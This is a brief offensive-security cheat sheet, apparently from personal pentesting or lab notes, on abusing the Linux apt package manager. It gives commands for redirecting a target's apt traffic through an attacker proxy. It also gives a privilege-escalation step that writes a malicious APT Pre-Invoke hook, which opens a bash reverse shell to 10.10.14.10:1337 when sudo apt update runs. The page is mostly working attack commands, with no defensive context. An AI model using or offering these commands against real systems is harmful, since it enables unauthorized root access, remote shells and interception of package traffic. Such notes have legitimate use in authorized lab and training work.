---
title: "Apt"
date: 2024-7-4
tags: ["apt", "update", "privesc", "pre-invoke", "sudo"]
---

---
### MITM (Man-in-the-Middle)

#### In target

```bash
# In target
export http_proxy=http://10.10.14.10:8888
```

#### In local

```bash
# Tool
pip3 install --upgrade proxy.py
```

```bash
# Start a proxy server
proxy --hostname 0.0.0.0 --port 8888
```

```bash
# Edit /etc/hosts to point to yours server
10.10.14.10 apt.update.example.com
```

### Privesc

#### Abuse apt update

```bash
# Create a malicious config
echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'\''"}' > /etc/apt/apt.conf.d/evil
```

```bash
# Exploit
sudo apt update -y
```

<br>